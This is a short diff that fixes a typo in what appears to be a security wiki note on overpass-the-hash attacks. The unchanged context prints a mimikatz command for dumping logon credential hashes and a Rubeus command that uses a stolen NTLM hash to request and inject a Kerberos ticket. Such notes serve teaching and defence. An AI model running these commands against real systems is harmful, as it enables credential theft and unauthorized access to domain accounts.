@@ -13,7 +13,7 @@ The attacker uses a tool to extract the [[NTLM]] hash of a user that is currentl
 mimikatz # sekurlsa::logonpasswords
 ```
 
-The attacker then crafts a new AS-REQ request for a the user to request a TGT ticket.
+The attacker then crafts a new AS-REQ request for the user to request a TGT ticket.
 - Does not require elevated privileges.
 ```powershell
 .\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<NTLM-HASH> ptt
